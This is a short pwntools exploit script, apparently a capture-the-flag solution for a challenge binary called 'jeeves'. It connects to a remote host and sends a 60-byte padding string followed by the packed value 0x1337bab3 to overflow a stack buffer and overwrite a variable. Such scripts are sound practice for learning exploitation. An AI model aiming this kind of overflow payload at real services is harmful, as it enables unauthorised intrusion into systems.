from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

r = remote("178.62.95.229", 31468,)
# r = process("./jeeves")
address = p64(0x1337bab3)
payload = ("a" * 60).encode() + address
r.sendline(payload)
success(r.recv())